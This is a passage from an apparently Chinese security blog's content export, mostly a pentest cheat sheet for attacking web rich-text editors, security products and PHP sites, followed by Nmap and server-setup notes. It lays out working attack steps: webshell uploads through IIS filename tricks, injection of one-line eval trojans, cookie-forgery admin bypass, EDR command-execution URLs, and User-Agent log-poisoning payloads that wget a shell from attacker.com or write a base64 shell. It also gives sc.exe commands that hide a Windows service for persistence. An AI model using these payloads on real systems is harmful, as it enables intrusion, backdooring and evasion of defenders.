、admin/admin9991、点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！(请修改action字段)Action.html6、需要突破上传文件类型限制么？Come here! —&gt;&gt; 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—&gt;本条信息来源：微笑刺客eWebEditor 可下载数据库，但密文解不开脆弱描述：当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.攻击利用:比如 ID=46 s-name =standard1构造 代码: ewebeditor.asp?id=content&amp;style=standardID和和样式名改过后ewebeditor.asp?id=46&amp;style=standard1eWebEditor遍历目录漏洞脆弱描述：ewebeditor/admin_uploadfile.aspadmin/upload.asp过滤不严，造成遍历目录漏洞攻击利用:第一种:ewebeditor/admin_uploadfile.asp?id=14在id=14后面添加&amp;dir=..再加 &amp;dir=../..&amp;dir=http://www.xxxx.com/../.. 看到整个网站文件了第二种: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..eWebEditor 5.2 列目录漏洞脆弱描述：ewebeditor/asp/browse.asp过滤不严，造成遍历目录漏洞攻击利用：http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/..利用eWebEditor session欺骗漏洞,进入后台脆弱描述：漏洞文件:Admin_Private.asp只判断了session，没有判断cookies和路径的验证问题。攻击利用:新建一个test.asp内容如下:&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;访问test.asp，再访问后台任何文件，for example:Admin_Default.aspeWebEditor asp版 2.1.6 上传漏洞攻击利用:（请修改action字段为指定网址）ewebeditor asp版2.1.6上传漏洞利用程序.htmleWebEditor 2.7.0 注入漏洞攻击利用:http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.eWebEditor2.8.0最终版删除任意文件漏洞脆弱描述：此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。攻击利用: (请修改action字段为指定网址)Del Files.htmleWebEditor PHP/ASP 后台通杀漏洞影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。攻击利用:进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.这时候你清空浏览器的url,然后输入javascript:alert(document.cookie=”adminuser=”+escape(“admin”));javascript:alert(document.cookie=”adminpass=”+escape(“admin”));javascript:alert(document.cookie=”admindj=”+escape(“1”));而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。eWebEditor for php任意文件上传漏洞影响版本:ewebeditor php v3.8 or older version脆弱描述:此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。攻击利用:phpupload.htmleWebEditor JSP版漏洞大同小异。eWebEditor 2.8 商业版插一句话木马影响版本:=&gt;2.8 商业版攻击利用:登陆后台，点击修改密码—-新密码设置为 1&quot;:eval request(&quot;h&quot;)’设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)脆弱描述：WebEditorNet 主要是一个upload.aspx文件存在上传漏洞。攻击利用:默认上传地址：/ewebeditornet/upload.aspx可以直接上传一个cer的木马如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。</code></pre><h3 id="southidceditor-一般使用v2-8-0版eWeb核心"><a href="#southidceditor-一般使用v2-8-0版eWeb核心" class="headerlink" title="southidceditor(一般使用v2.8.0版eWeb核心)"></a>southidceditor(一般使用v2.8.0版eWeb核心)</h3><pre><code>http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdbhttp://www.xxxx.com/admin/southidceditor/admin/admin_login.asphttp://www.xxxx.com/admin/southidceditor/popup.aspbigcneditor(eWeb 2.7.5 VIP核心)其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。或许上面    针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作Cute Editor</code></pre><h3 id="Cute-Editor在线编辑器本地包含漏洞"><a href="#Cute-Editor在线编辑器本地包含漏洞" class="headerlink" title="Cute Editor在线编辑器本地包含漏洞"></a>Cute Editor在线编辑器本地包含漏洞</h3><pre><code>影响版本:CuteEditor For Net 6.4脆弱描述：可以随意查看网站文件内容，危害较大。攻击利用:http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.configCute Editor Asp.Net版利用iis解析漏洞获得权限影响版本：CuteEditor for ASP.NET中文版脆弱描述：脆弱描述：CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。攻击利用：可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。</code></pre><h3 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h3><pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL影响版本：&lt;= Webhtmleditor最终版1.7 (已停止更新)脆弱描述/攻击利用：对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。</code></pre><h3 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h3><pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL影响版本: &lt;= kindeditor 3.2.1(09年8月份发布的最新版)脆弱描述/攻击利用：拿官方做个演示：进入http://www.xxxx.com/ke/examples/index.html 随意点击一个demo后点图片上传，某君上传了如下文件：http://www.xxxx.com/ke/attached/test.asp;.jpgNote:参见附录C原理解析。</code></pre><h3 id="Freetextbox"><a href="#Freetextbox" class="headerlink" title="Freetextbox"></a>Freetextbox</h3><pre><code>Freetextbox遍历目录漏洞影响版本：未知脆弱描述：因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\符号所以导致出现了遍历目录的问题。攻击利用:在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\..Freetextbox Asp.Net版利用IIS解析漏洞获得权限影响版本：所有版本脆弱描述：没做登陆验证可以直接访问上传木马Freetextbox 3-3-1 可以直接上传任意格式的文件Freetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg攻击利用：利用IIS解析漏洞拿SHELL。上传后SHELL的路径为http://www.xxxx.com/images/x.asp;.jpg</code></pre><h3 id="Msn-editor"><a href="#Msn-editor" class="headerlink" title="Msn editor"></a>Msn editor</h3><pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL影响版本：未知脆弱描述：点击图片上传后会出现上传页面，地址为http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=用普通的图片上传后，地址为http://www.xxxx.com/news/uppic/41513102009204012_1.gif记住这时候的路径，再点击图片的上传，这时候地址就变成了http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012很明显。图片的地址是根据RemNum后面的编号生成的。攻击利用:配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址uppic/1.asp;41513102009204012_2.gif直接打开是小马地址！</code></pre><h3 id="Ueditor"><a href="#Ueditor" class="headerlink" title="Ueditor"></a>Ueditor</h3><pre><code>1.4.3.3 .net版本&lt;form action=&quot;http://xx.com/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;加载一个远程图片shell表单在远程图片后加?.aspx如 http://1.1.1.1/uploads/1.gif?.aspx</code></pre><h2 id="宝塔面板未授权访问phpmyadmin"><a href="#宝塔面板未授权访问phpmyadmin" class="headerlink" title="宝塔面板未授权访问phpmyadmin"></a>宝塔面板未授权访问phpmyadmin</h2><pre><code>宝塔Linux面板7.4.2版本宝塔Linux测试版7.5.13Windows面板6.8版本直接访问http://your_ip:888/pma</code></pre><h2 id="深x服"><a href="#深x服" class="headerlink" title="深x服"></a>深x服</h2><pre><code>EDR RCEhttps://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id 即可执行命令终端检测响应平台任意用户登录fofa: title=&quot;终端检测响应平台&quot;target+/ui/login.php?user=admin 即可直接登录</code></pre><h2 id="天r信"><a href="#天r信" class="headerlink" title="天r信"></a>天r信</h2><pre><code>默认用户superman的uid=1POST /?module-auth_user&amp;action=mod_edit.pwd HTTP/1.1</code></pre><h2 id="从LFI到RCE"><a href="#从LFI到RCE" class="headerlink" title="从LFI到RCE"></a>从LFI到RCE</h2><pre><code>当有个lfi时https://www.website.com/index.php?pg=../../../../etc/passwd尝试包含/proc/self/environhttps://www.website.com/index.php?pg=../../../../proc/self/environ若是存在user-agent标识修改ua来实现rce:User-Agent: &lt;?system(&#39;wget http://attacker.com/shell.txt -O shell.php&#39;);?&gt;User-Agent: &lt;?exec(&#39;wget http://attacker.com/shell.txt -O shell.php&#39;);?&gt;User-Agent: &lt;?php phpinfo(); ?&gt;也可以在服务器内部来创建文件写入shellUser-Agent: &lt;?php $a = base64_decode(&#39;PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg==&#39;); $file = fopen(&#39;shell.php&#39;,&#39;w&#39;); echo fwrite($file,$a); fclose($file); ?&gt;</code></pre><h2 id="隐藏windows服务"><a href="#隐藏windows服务" class="headerlink" title="隐藏windows服务"></a>隐藏windows服务</h2><pre><code>Translate from: https://www.sans.org/blog/red-team-tactics-hiding-windows-services/Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为逃避基于主机的常见威胁搜寻技术的检测提供了机会。这里假设Fax服务是我们的恶意文件或后门打开services.msc可以看到服务</code></pre><p><img src="./img/849.png" alt="image"></p><pre><code>执行命令可以看到服务</code></pre><p><img src="./img/850.png" alt="image"></p><pre><code>管理员权限下执行以下命令，安全标识符定义语言(SDDL)</code></pre><p><img src="./img/851.png" alt="image"></p><pre><code>&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></pre><p><img src="./img/852.png" alt="image"></p><pre><code>可以看到已经查询不到了</code></pre><p><img src="./img/853.png" alt="image"></p><pre><code>在红队或渗透测试中，这可能是一种有用的技术，可以在受感染主机上保持持久性。重启后，隐藏的服务也会自动启动。取消隐藏的命令&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 命令速查</title>
      <link href="2020/02/28/nmap-ming-ling-su-cha/"/>
      <url>2020/02/28/nmap-ming-ling-su-cha/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-命令详解"><a href="#Nmap-命令详解" class="headerlink" title="Nmap 命令详解"></a>Nmap 命令详解</h1><span id="more"></span><h2 id="1-端口扫描探测"><a href="#1-端口扫描探测" class="headerlink" title="1.端口扫描探测"></a>1.端口扫描探测</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">-sT   #TCP connect() 扫描，这种方式会在目标主机中的日志中记录大量的链接请求和错误信息-sS   #半开扫描，很少有系统将其记录在系统日志，需要root权限-sF -sN  #密码FIN数据包扫描，Xmas Tree、Null扫描模式-sP  #ping 扫描，nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描-sU  #UDP扫描，但不可靠-sA  #这项高级的扫描方式通常用来穿过防火墙的规则集-sV  #探测端口服务版本-P0  #扫描之前不需要使用ping命令-v  #显示扫描过程-h  #帮助选项-p  #制定端口-O  #启用远程操作系统检测，启动脚本检测、扫描-A  #全面系统检测，启用脚本检测，扫描-oN&#x2F;-oX&#x2F;-oG #将报告写入文件，正常&#x2F;XML&#x2F;grepable 三种格式-T4 #针对TCP端口禁止动态扫描延迟超过十秒-iL #读取主机列表 例如 -iL C：\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-web扫描"><a href="#2-web扫描" class="headerlink" title="2.web扫描"></a>2.web扫描</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 80 --script&#x3D;http-enum.nse www.xxx.com. #扫描敏感目录nmap -p 80 --script&#x3D;sql-injection.nse www.xxx.com # 扫描sql注入nmap --script all 127.0.0.1 #所有脚本扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器相关配置</title>
      <link href="2020/01/27/fu-wu-qi-xiang-guan-pei-zhi-zi-cha-biao/"/>
      <url>2020/01/27/fu-wu-qi-xiang-guan-pei-zhi-zi-cha-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><span id="more"></span><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ol><li><h4 id="下载docker-ce的repo"><a href="#下载docker-ce的repo" class="headerlink" title="下载docker-ce的repo"></a>下载docker-ce的repo</h4></li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl https:&#x2F;&#x2F;[download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo](http:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo) -o &#x2F;etc&#x2F;yum.repos.d&#x2F;docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装依赖（这是相比centos7的关键步骤）</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install https:&#x2F;&#x2F;[download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm](http:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>安装docker-ce</li></ol><p><code>yum install docker-ce -y</code></p><ol start="4"><li>启动docker</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker-compose"></a>Docker-compose</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip3 install docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Screen-配置"><a href="#Screen-配置" class="headerlink" title="Screen 配置"></a>Screen 配置</h2><p>1.安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install screen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.相关参数</p><pre class="line-numbers language-none"><code class="language-none">screen -S yourname -&gt; 新建一个叫yourname的sessionscreen -ls         -&gt; 列出当前所有的sessionscreen -r yourname -&gt; 回到yourname这个sessionscreen -d yourname -&gt; 远程detach某个sessionscreen -d -r yourname -&gt; 结束当前session并回到yourname这个session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置MSF"><a href="#配置MSF" class="headerlink" title="配置MSF"></a>配置MSF</h2><p>1.下载msf</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install curl,wgetcurl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  .&#x2F;msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.非root 权限使用 MSF( 成功安装后请运行下属代码，以使下载的最新版本的msf连接数据库。)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">adduser msfsu msf.&#x2F;msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.PS.在运行时请cd到msfconsole所在目录，应在”/opt/metasploit-framework/bin”</p><p>初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用以下命令，然后使用非root用户初始化数据库。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfdb reinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h2><p>1.启动docker</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker pull toolisticon&#x2F;kalilinux  docker run -t -i toolisticon&#x2F;kalilinux   &#x2F;bin&#x2F;bashapt-get update &amp;&amp; apt-get install metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h2><p>1.获取wget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum -y install wget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.下载mysql安装包</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql57-community-release-el7-8.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.安装MySQL</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rpm -ivh mysql57-community-release-el7-8.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.安装mysql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd &#x2F;etc&#x2F;yum.repos.d&#x2F;yum -y install mysql-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.启动mysql</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.修改MySQL临时密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">grep &#39;temporary password&#39; &#x2F;var&#x2F;log&#x2F;mysqld.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.登录mysql</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -uroot -p #我的临时密码是：a22XRJ88&#x3D;+a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.把MySQL的密码校验强度改为低风险</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set global validate_password_policy&#x3D;LOW;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9.修改MySQL的密码长度</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set global validate_password_length&#x3D;5;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10.修改MySQL密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;xxx&#39;; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11.若允许远程访问，首先要关闭Cenots的防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>12.切换到mysql数据</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">use mysql;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>13.修改为允许任何地址访问</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">update user set Host&#x3D;&#39;%&#39; where User&#x3D;&#39;root&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>14.刷新权限</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
